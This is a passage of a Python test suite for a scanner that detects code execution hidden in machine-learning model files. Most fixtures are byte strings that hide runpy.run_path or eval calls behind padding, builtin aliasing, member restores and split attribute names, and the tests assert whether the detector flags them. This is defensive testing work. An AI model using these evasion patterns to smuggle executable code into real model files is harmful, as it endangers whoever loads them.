                b"import builtins\noriginal = rp.run_path\nrp.run_path = print\n"
                b"real_dict = builtins.dict\nremove = real_dict.pop\nremove(rp.__dict__, 'run_path')\n",
                b"rp.__dict__.setdefault('run_path', original)\n",
                True,
            ),
            (
                b"from builtins import dict as real_dict\noriginal = rp.run_path\nrp.run_path = print\n"
                b"real_dict.pop(rp.__dict__, 'run_path')\n",
                b"rp.__dict__.setdefault('run_path', original)\n",
                True,
            ),
            (
                b"from builtins import (\n    dict as real_dict,\n)\n"
                b"original = rp.run_path\nrp.run_path = print\nreal_dict.pop(rp.__dict__, 'run_path')\n",
                b"rp.__dict__.setdefault('run_path', original)\n",
                True,
            ),
            (
                b"from builtins import (\n    dict as real_dict,\n    len as spare,\n)\n"
                b"original = rp.run_path\nrp.run_path = print\nreal_dict.pop(rp.__dict__, 'run_path')\n",
                b"rp.__dict__.setdefault('run_path', original)\n",
                True,
            ),
            (
                b"pass; from builtins import dict as real_dict\n"
                b"original = rp.run_path\nrp.run_path = print\nreal_dict.pop(rp.__dict__, 'run_path')\n",
                b"rp.__dict__.setdefault('run_path', original)\n",
                True,
            ),
            (
                b"0; from builtins import dict as real_dict\n"
                b"original = rp.run_path\nrp.run_path = print\nreal_dict.pop(rp.__dict__, 'run_path')\n",
                b"rp.__dict__.setdefault('run_path', original)\n",
                True,
            ),
            (
                b"if True: from builtins import dict as real_dict\n"
                b"original = rp.run_path\nrp.run_path = print\nreal_dict.pop(rp.__dict__, 'run_path')\n",
                b"rp.__dict__.setdefault('run_path', original)\n",
                True,
            ),
            (
                b"if True:\n    from builtins import dict as real_dict\n"
                b"original = rp.run_path\nrp.run_path = print\nreal_dict.pop(rp.__dict__, 'run_path')\n",
                b"rp.__dict__.setdefault('run_path', original)\n",
                True,
            ),
            (
                b"enabled = True\nif enabled:\n    from builtins import dict as real_dict\n"
                b"original = rp.run_path\nrp.run_path = print\nreal_dict.pop(rp.__dict__, 'run_path')\n",
                b"rp.__dict__.setdefault('run_path', original)\n",
                True,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"from builtins import (\n    dict as real_dict,\n    len as spare,\n)\n"
                b"real_dict.pop(rp.__dict__, 'run_path')\nrp.__dict__.setdefault('run_path', original)\n",
                True,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"from builtins import dict as real_dict, \\\n    len as spare\n"
                b"real_dict.pop(rp.__dict__, 'run_path')\nrp.__dict__.setdefault('run_path', original)\n",
                True,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"from builtins import dict as real_dict; pass\nreal_dict.pop(rp.__dict__, 'run_path')\n"
                b"rp.__dict__.setdefault('run_path', original)\n",
                True,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"pass; from builtins import dict as real_dict\nreal_dict.pop(rp.__dict__, 'run_path')\n"
                b"rp.__dict__.setdefault('run_path', original)\n",
                True,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"0; from builtins import dict as real_dict\nreal_dict.pop(rp.__dict__, 'run_path')\n"
                b"rp.__dict__.setdefault('run_path', original)\n",
                True,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"if True: from builtins import dict as real_dict\nreal_dict.pop(rp.__dict__, 'run_path')\n"
                b"rp.__dict__.setdefault('run_path', original)\n",
                True,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"if True:\n    from builtins import dict as real_dict\n"
                b"real_dict.pop(rp.__dict__, 'run_path')\nrp.__dict__.setdefault('run_path', original)\n",
                True,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"enabled = True\nif enabled:\n    from builtins import dict as real_dict\n"
                b"real_dict.pop(rp.__dict__, 'run_path')\nrp.__dict__.setdefault('run_path', original)\n",
                True,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"enabled = False\nglobals()['enabled'] = True\nif enabled:\n"
                b"    from builtins import dict as real_dict\nreal_dict.pop(rp.__dict__, 'run_path')\n"
                b"rp.__dict__.setdefault('run_path', original)\n",
                True,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"enabled = True\nglobals = lambda: {}\nglobals()['enabled'] = False\nif enabled:\n"
                b"    from builtins import dict as real_dict\nreal_dict.pop(rp.__dict__, 'run_path')\n"
                b"rp.__dict__.setdefault('run_path', original)\n",
                True,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"enabled = False\nglobals = lambda: {}\ndel globals\nglobals()['enabled'] = True\nif enabled:\n"
                b"    from builtins import dict as real_dict\nreal_dict.pop(rp.__dict__, 'run_path')\n"
                b"rp.__dict__.setdefault('run_path', original)\n",
                True,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"enabled = False\nglobals()['globals'] = lambda: {}\ndel globals\n"
                b"globals()['enabled'] = True\nif enabled:\n    from builtins import dict as real_dict\n"
                b"real_dict.pop(rp.__dict__, 'run_path')\nrp.__dict__.setdefault('run_path', original)\n",
                True,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\nremove = dict.pop\nrelay = remove\n"
                b"relay(rp.__dict__, 'run_path')\n",
                b"rp.__dict__.setdefault('run_path', original)\n",
                True,
            ),
        ],
    )
    def test_scan_model_preserves_latest_late_runpy_member_state(
        self, prefix_state: bytes, late_state: bytes, expect_finding: bool
    ) -> None:
        detector = JITScriptDetector()
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xffimport runpy as rp\n"
            + prefix_state
            + padding
            + late_state
            + b"((rp).run_path)('payload.py')\n"
            + padding
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")
        has_dynamic_finding = any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

        assert has_dynamic_finding is expect_finding

    @pytest.mark.parametrize(
        ("late_state", "call_line"),
        [
            (b"mod = rp\nmod.run_path = original\n", b"((mod).run_path)('payload.py')\n"),
            (b"mod = rp\nmod.run_path = original\n", b"((rp).run_path)('payload.py')\n"),
            (b"\x00\xffrp.run_path = original\n\x00\xff", b"((rp).run_path)('payload.py')\n"),
            (b"\x00\xffrp.run_path = original\n", b"\x00\xff(\n rp.run_path\n)('payload.py')\n"),
            (b"\x00\xffrp.run_path = original\n", b"\x00\xffrp \\\n .run_path('payload.py')\n"),
            (
                b"\x00\xffrp.run_path = original\n",
                b"\x00\xffgetattr \\\n (rp, 'run_path')('payload.py')\n",
            ),
            (
                b"\x00\xffrp.run_path = original\n",
                b"\x00\xffgetattr(rp, 'run_path')('payload.py')\n",
            ),
            (
                b"\x00\xffrp.run_path = original\n",
                b"\x00\xffgetattr(rp, 'run_' + 'path')('payload.py')\n",
            ),
            (
                b"\x00\xffrp.run_path = original\n",
                b"\x00\xffgetattr \\\n (rp, 'run_' + 'path')('payload.py')\n",
            ),
            (
                b"\x00\xffrp.run_path = original\n",
                b"\x00\xffgetattr(\n rp, 'run_' + 'path'\n)('payload.py')\n",
            ),
            (b"\x00\xffrp.__dict__['run_path'] = original\n", b"((rp).run_path)('payload.py')\n"),
            (b"\x00\xffvars(rp).update(run_path=original)\n", b"((rp).run_path)('payload.py')\n"),
            (
                b"\x00\xffrp.__dict__.update({'other': print, 'run_path': original})\n",
                b"((rp).run_path)('payload.py')\n",
            ),
            (
                b"\x00\xffvars(rp).update(other=print, run_path=original)\n",
                b"((rp).run_path)('payload.py')\n",
            ),
            (b"\x00\xffrp.__dict__.update(**{'run_path': original})\n", b"((rp).run_path)('payload.py')\n"),
            (
                b"\x00\xffrp.__dict__.update({'other': {'x': print}, 'run_path': original})\n",
                b"((rp).run_path)('payload.py')\n",
            ),
            (
                b"restore = rp.__dict__.update\n\x00\xffrestore(run_path=original)\n",
                b"((rp).run_path)('payload.py')\n",
            ),
            (b"\x00\xffdict.update(rp.__dict__, run_path=original)\n", b"((rp).run_path)('payload.py')\n"),
            (
                b"\x00\xffrestore = dict.update\nrestore(rp.__dict__, run_path=original)\n",
                b"((rp).run_path)('payload.py')\n",
            ),
            (
                b"import builtins\n\x00\xffrestore = builtins.dict.update\nrestore(rp.__dict__, run_path=original)\n",
                b"((rp).run_path)('payload.py')\n",
            ),
            (
                b"ns = rp.__dict__\n\x00\xffns.update(run_path=original)\n",
                b"((rp).run_path)('payload.py')\n",
            ),
            (
                b"restore = vars(rp).update\n\x00\xffrestore(run_path=original)\n",
                b"((rp).run_path)('payload.py')\n",
            ),
            (
                b"\x00\xffns = rp.__dict__\nns.update(run_path=original)\n",
                b"((rp).run_path)('payload.py')\n",
            ),
            (
                b"\x00\xffrestore = vars(rp).update\nrestore(run_path=original)\n",
                b"((rp).run_path)('payload.py')\n",
            ),
            (
                b"mod = rp\nns = mod.__dict__\nns.update(run_path=original)\n",
                b"((rp).run_path)('payload.py')\n",
            ),
            (
                b"mod = rp\nrestore = vars(mod).update\nrestore(run_path=original)\n",
                b"((rp).run_path)('payload.py')\n",
            ),
            (
                b"mod = rp\nmapping = mod.__dict__\nrestore = mapping.update\nrestore(run_path=original)\n",
                b"((rp).run_path)('payload.py')\n",
            ),
            (
                b"mod = rp\nmapping = mod.__dict__\nsecond = mapping\nrestore = second.update\n"
                b"restore(run_path=original)\n",
                b"((rp).run_path)('payload.py')\n",
            ),
            (
                b"mod = rp\nmapping = mod.__dict__\nrestore = mapping.update\napply = restore\n"
                b"apply(run_path=original)\n",
                b"((rp).run_path)('payload.py')\n",
            ),
            (b"\x00\xffrp.__dict__['run_' + 'path'] = original\n", b"((rp).run_path)('payload.py')\n"),
            (b"\x00\xffrp.__dict__['run' + '_path'] = original\n", b"((rp).run_path)('payload.py')\n"),
            (
                b"\x00\xffrp.__dict__[\n    'run' + '_path'\n] = original\n",
                b"((rp).run_path)('payload.py')\n",
            ),
            (
                b"\x00\xffrp.__dict__.update(\n    **{'run' + '_path': original}\n)\n",
                b"((rp).run_path)('payload.py')\n",
            ),
            (
                b"\x00\xffrp.__dict__.__setitem__('run_' + 'path', original)\n",
                b"((rp).run_path)('payload.py')\n",
            ),
            (
                b"if globals().get('enabled'):\n    rp.run_path = original\n",
                b"((rp).run_path)('payload.py')\n",
            ),
            (
                b"if globals().get('enabled'):\n    restore = dict.update\nrestore(rp.__dict__, run_path=original)\n",
                b"((rp).run_path)('payload.py')\n",
            ),
            (
                b"class Restore:\n    rp.run_path = original\n",
                b"((rp).run_path)('payload.py')\n",
            ),
            (
                b"restore = (\n    dict.update\n)\nrestore(rp.__dict__, run_path=original)\n",
                b"((rp).run_path)('payload.py')\n",
            ),
            (
                b"import builtins\nrestore = getattr(builtins, 'dict').update\n"
                b"restore(rp.__dict__, run_path=original)\n",
                b"((rp).run_path)('payload.py')\n",
            ),
            (
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nreal = builtins.dict\nbuiltins.dict = Safe\nmapping = builtins.__dict__\n"
                b"restore = mapping.update\nrestore(dict=real)\n"
                b"builtins.dict.update(rp.__dict__, run_path=original)\n",
                b"((rp).run_path)('payload.py')\n",
            ),
            (
                b"import builtins\nnamespace_of = builtins.vars\nbuiltins.vars = lambda obj: {}\n"
                b"namespace_of(rp).update(run_path=original)\n",
                b"((rp).run_path)('payload.py')\n",
            ),
            (
                b"import builtins\nnamespace_of = builtins.vars\nbuiltins.vars = lambda obj: {}\n"
                b"mapping = namespace_of(rp)\nrestore = mapping.update\nrestore(run_path=original)\n",
                b"((rp).run_path)('payload.py')\n",
            ),
            (
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nreal = builtins.dict\nbuiltins.dict = Safe\n"
                b"if globals().get('enabled'):\n    mapping = builtins.__dict__\n"
                b"mapping.update(dict=real)\nbuiltins.dict.update(rp.__dict__, run_path=original)\n",
                b"((rp).run_path)('payload.py')\n",
            ),
            (
                b"class Restore:\n    restore = dict.update\n    restore(rp.__dict__, run_path=original)\n",
                b"((rp).run_path)('payload.py')\n",
            ),
            (
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nreal = builtins.dict\nbuiltins.dict = Safe\nmapping = builtins.__dict__\n"
                b"restore = mapping.update\nif globals().get('enabled'):\n    restore = Safe.update\n"
                b"restore(dict=real)\nbuiltins.dict.update(rp.__dict__, run_path=original)\n",
                b"((rp).run_path)('payload.py')\n",
            ),
            (
                b"harmless = None\nfield: setattr(rp, 'run_path', original) = harmless\n",
                b"rp.run_path('payload.py')\n",
            ),
        ],
    )
    def test_scan_model_detects_possible_late_runpy_member_restore(self, late_state: bytes, call_line: bytes) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        source = (
            b"\x00\xffimport runpy as rp\noriginal = rp.run_path\nrp.run_path = print\n"
            + padding
            + late_state
            + call_line
            + padding
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        ("prefix_state", "tail_state"),
        [
            (
                b"import builtins\nread_member = builtins.getattr\nbuiltins.getattr = lambda *args: print\n",
                b"read_member(rp, 'run_path')('payload.py')\n",
            ),
            (
                b"import builtins\nread_member = builtins.getattr\nbuiltins.getattr = lambda *args: print\n",
                b"read_member \\\n (rp, 'run_path')('payload.py')\n",
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\nimport builtins\n"
                b"namespace_of = builtins.vars\nbuiltins.vars = lambda obj: {}\n",
                b"namespace_of(rp).update(run_path=original)\n((rp).run_path)('payload.py')\n",
            ),
        ],
    )
    def test_scan_model_detects_saved_builtin_helper_runpy_action_across_padding(
        self, prefix_state: bytes, tail_state: bytes
    ) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        source = b"\x00\xffimport runpy as rp\n" + prefix_state + padding + tail_state + padding

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_deep_folded_framed_runpy_getattr_without_recursion(self) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        member_expression = b" + ".join([b"'run_'", *([b"''"] * 1_000), b"'path'"])
        source = (
            b"\x00\xffimport runpy as rp\n"
            + padding
            + b"\x00\xffgetattr(rp, "
            + member_expression
            + b")('payload.py')\n"
            + padding
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    @pytest.mark.parametrize("frame", [b"", b"\x00\xff"])
    def test_scan_model_detects_late_runpy_call_after_unreachable_member_overwrite(self, frame: bytes) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        source = (
            b"\x00\xffimport runpy as rp\n"
            + padding
            + frame
            + b"if False:\n    rp.__dict__.update(run_path=print)\n"
            + b"rp.run_path('payload.py')\n"
            + padding
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        "shadow_state",
        [
            b"class Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n        pass\n"
            + b"dict = Safe\ndict.update(rp.__dict__, run_path=print)\n",
            b"import builtins as bi\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
            + b"        pass\nbi.dict = Safe\nbuiltins.dict.update(rp.__dict__, run_path=print)\n",
        ],
    )
    def test_scan_model_ignores_shadowed_dict_update_before_dangerous_runpy_call(self, shadow_state: bytes) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        source = b"\x00\xffimport runpy as rp\n" + padding + shadow_state + b"((rp).run_path)('payload.py')\n" + padding

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        "call_line",
        [b"getattr(rp, 'run_path')('safe')\n", b"getattr(\n    rp, 'run_path'\n)('safe')\n"],
    )
    def test_scan_model_ignores_shadowed_getattr_execution_endpoint(self, call_line: bytes) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        source = (
            b"\x00\xffimport runpy as rp\n" + padding + b"getattr = lambda obj, name: print\n" + call_line + padding
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_handles_distinct_builtins_alias_noise_before_safe_runpy_call(self) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        aliases = b"".join(f"bi_{index} = builtins\n".encode() for index in range(4_000))
        noise = b"    # noise\n" * 1_000
        source = (
            b"\x00\xffimport runpy as rp\nimport builtins\n"
            + padding
            + aliases
            + noise
            + b"rp.run_path = print\nrp.run_path('safe')\n"
            + padding
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_handles_distinct_builtins_alias_helper_write_noise_before_safe_runpy_call(self) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        aliases = b"".join(f"bi_{index} = builtins\n".encode() for index in range(2_000))
        writes = b"".join(f"bi_0.setattr = lambda *args: None  # write {index}\n".encode() for index in range(2_000))
        source = (
            b"\x00\xffimport runpy as rp\nimport builtins\n"
            + padding
            + aliases
            + writes
            + b"rp.run_path = print\nrp.run_path('safe')\n"
            + padding
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    @pytest.mark.parametrize("identifier_count", [25, 50, 100])
    def test_canonical_builtin_helper_lookup_scales_with_current_identifiers(self, identifier_count: int) -> None:
        identifiers = {f"helper_{index}" for index in range(identifier_count)}
        aliases = _CountingAliasMapping(
            {
                **dict.fromkeys(identifiers, "vars"),
                **{f"unrelated_{index}": "getattr" for index in range(identifier_count * 8)},
            }
        )

        matched = jit_script_module._canonical_builtin_helper_aliases_in(
            identifiers,
            aliases,
            {"vars"},
        )

        assert matched == identifiers
        assert aliases.lookups == identifier_count
        assert aliases.iterations == 0

    @pytest.mark.parametrize("alias_count", [25, 50, 100])
    def test_multiline_builtins_alias_continuation_lookup_is_linear(
        self, alias_count: int, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        original_line_check = jit_script_module._line_starts_continued_priority_getattr
        calls = 0
        lookups = 0
        iterations = 0
        alias_map_sizes: list[int] = []

        def counted_line_check(
            code_line: bytes,
            canonical_builtin_helper_aliases: Mapping[str, str] | None = None,
            shadowed_builtin_helper_names: set[str] | None = None,
        ) -> bool:
            nonlocal calls, lookups, iterations
            calls += 1
            alias_map_sizes.append(len(canonical_builtin_helper_aliases or {}))
            counted_aliases = _CountingAliasMapping(canonical_builtin_helper_aliases or {})
            result = original_line_check(code_line, counted_aliases, shadowed_builtin_helper_names)
            lookups += counted_aliases.lookups
            iterations += counted_aliases.iterations
            return result

        monkeypatch.setattr(
            jit_script_module,
            "_line_starts_continued_priority_getattr",
            counted_line_check,
        )
        candidate = b"".join(f"bi_{index} = (\n    builtins\n)\n".encode() for index in range(alias_count))

        usage_lines, proved_rule_codes = jit_script_module._priority_alias_usage_lines(
            candidate,
            frozenset({b"rp"}),
            0,
        )

        assert usage_lines == []
        assert proved_rule_codes == frozenset()
        assert calls == 3 * alias_count
        assert lookups == 2 * alias_count
        assert iterations == 0
        assert alias_map_sizes[-1] == 4 * alias_count + 8

    @pytest.mark.parametrize(
        ("helper_transition", "endpoint", "expect_dynamic_finding"),
        [
            pytest.param(
                b"",
                b"read_member(\n    rp,\n    'run_path'\n)('payload.py')\n",
                True,
                id="malicious",
            ),
            pytest.param(
                b"read_member = len\n",
                b"read_member(\n    []\n)\n",
                False,
                id="safe-rebound",
            ),
        ],
    )
    def test_scan_model_preserves_multiline_getattr_alias_state_after_alias_noise(
        self, helper_transition: bytes, endpoint: bytes, expect_dynamic_finding: bool
    ) -> None:
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        aliases = b"".join(f"bi_{index} = (\n    builtins\n)\n".encode() for index in range(16))
        source = (
            b"\x00\xffimport runpy as rp\nimport builtins\nread_member = builtins.getattr\n"
            + aliases
            + padding
            + helper_transition
            + endpoint
            + padding
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.bin")
        has_dynamic_finding = any(
            finding.type == "code_execution_pattern" and finding.pattern == "Dynamic module execution detected"
            for finding in findings
        )

        assert has_dynamic_finding is expect_dynamic_finding
        if not expect_dynamic_finding:
            assert not any(finding.type == "analysis_incomplete" for finding in findings)

    def test_scan_model_detects_multiline_unicode_getattr_alias_after_alias_noise(self) -> None:
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        aliases = b"".join(f"bi_{index} = (\n    builtins\n)\n".encode() for index in range(16))
        source = (
            b"\x00\xffimport runpy as rp\n"
            + "from builtins import getattr as réad\n".encode()
            + aliases
            + padding
            + "réad(\n    rp,\n    'run_path'\n)('payload.py')\n".encode()
            + padding
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.bin")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Dynamic module execution detected"
            for finding in findings
        )

    def test_scan_model_detects_tail_runpy_call_after_builtins_alias_helper_noise(self) -> None:
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        aliases = b"".join(f"bi_{index} = builtins\n".encode() for index in range(64))
        helper_writes = b"bi_0.setattr = lambda *args: None\n" * 64
        source = (
            b"\x00\xffimport runpy as rp\nimport builtins\n"
            + aliases
            + helper_writes
            + padding
            + b"\x00\xff((rp).run_path)('payload.py')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.bin")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Dynamic module execution detected"
            for finding in findings
        )

    def test_scan_model_keeps_safe_runpy_call_clean_after_builtins_alias_helper_noise(self) -> None:
        aliases = b"".join(f"bi_{index} = builtins\n".encode() for index in range(64))
        helper_writes = b"bi_0.setattr = lambda *args: None\n" * 64
        source = (
            b"import runpy as rp\nimport builtins\n"
            + aliases
            + helper_writes
            + b"rp.run_path = print\nrp.run_path('safe')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.bin")

        assert not any(finding.type in {"code_execution_pattern", "analysis_incomplete"} for finding in findings)

    def test_scan_model_detects_tail_framed_runpy_member_restore_with_prefix_context(self) -> None:
        detector = JITScriptDetector()
        filler = b"# filler\n" * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(b"# filler\n") + 1)
        source = (
            b"\x00\xffimport runpy as rp\noriginal = rp.run_path\nrp.run_path = print\n"
            + filler
            + b"\x00\xffrp.run_path = original\n\x00\xff((rp).run_path)('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_late_wildcard_import_call_after_priority_window(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = b"\x00\xff" + leading_blocks + b"from runpy import *\n" + padding + b"run_path('payload.py')\n"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_preserves_raw_runpy_hit_in_compacted_priority_gap(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = b"\x00\xff" + leading_blocks + b"import os\n" + padding + b"runpy.run_path('payload.py')\n" + padding

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_later_priority_alias_pair_inside_same_block(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"    # pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff" + leading_blocks + b"def payload():\n"
            b"    import os\n"
            + padding
            + b"    import runpy as rp\n"
            + padding
            + b"    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_embedded_python_prefix_context_tail_starts_are_bounded(self) -> None:
        prefix = b"\x00\xffimport runpy as rp\n" + b"# prefix\n" * 1024
        tail_blocks = b"".join(
            f'def harmless_{index}():\n    """rp.run_path(\'payload.py\')"""\n    return {index}\n'.encode()
            for index in range(128)
        )
        data = prefix + (b"# middle\n" * 130_000) + tail_blocks

        windows = jit_script_module._embedded_python_extraction_windows(data)

        assert len(windows) <= 3 + (2 * jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS)

    def test_single_window_prefix_context_checks_are_bounded(self, monkeypatch: pytest.MonkeyPatch) -> None:
        original_is_priority_context = jit_script_module._is_priority_prefix_context_statement
        priority_context_checks = 0

        def recording_is_priority_context(
            context: bytes,
            statement: bytes,
            active_priority_names: set[str] | None = None,
        ) -> bool:
            nonlocal priority_context_checks
            priority_context_checks += 1
            return original_is_priority_context(context, statement, active_priority_names)

        monkeypatch.setattr(
            jit_script_module,
            "_is_priority_prefix_context_statement",
            recording_is_priority_context,
        )
        data = b"\x00\xffsink = eval\n" + b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode() for index in range(128)
        )

        windows = jit_script_module._embedded_python_extraction_windows(data)

        assert windows
        assert priority_context_checks <= 1

    def test_contextual_priority_windows_skip_binary_without_priority_import(
        self,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        def unexpected_structural_scan(_line: bytes) -> bytes:
            raise AssertionError("binary lines should not be structurally scanned without a priority import")

        monkeypatch.setattr(jit_script_module, "_python_structural_line_bytes", unexpected_structural_scan)
        data = b"header\n\x00" + (b"benign binary payload\n" * 4096)

        assert jit_script_module._contextual_priority_framed_windows(data) == []

    def test_source_like_start_rejects_binary_assignment_opcode(self) -> None:
        binary_payload = b"\x80\x04K=\x94M:\x01M;\x01M<\x01M=\x01"

        assert jit_script_module._has_source_like_embedded_python_start(binary_payload) is False
        assert jit_script_module._has_source_like_embedded_python_start(b"\x00sink = eval\nsink('1+1')\n") is True

    def test_scan_model_does_not_flag_builtin_substring_inside_identifier(self) -> None:
        detector = JITScriptDetector()
        data = b"\x00\xffdef benign_weight_marker():\n    opened = 1\n    file_count = opened\n    return file_count\n"

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert not any(finding.type == "dangerous_builtin" for finding in findings)
        assert not any(finding.severity == "CRITICAL" for finding in findings)

    def test_scan_model_detects_alias_to_dangerous_builtin(self) -> None:
        detector = JITScriptDetector()
        data = b"\x00\xffdef payload(value):\n    sink = eval\n    return sink(value)\n"

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert any(finding.type == "dangerous_builtin" and finding.builtin == "eval" for finding in findings)

    def test_scan_model_detects_alias_to_builtins_module(self) -> None:
        detector = JITScriptDetector()
        data = b"\x00\xffdef payload(value):\n    import builtins as b\n    module = b\n    return module.eval(value)\n"

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert any(finding.type == "dangerous_builtin" and finding.builtin == "eval" for finding in findings)

    @pytest.mark.parametrize(
        "body",
        [
            "return __builtins__.eval(value)",
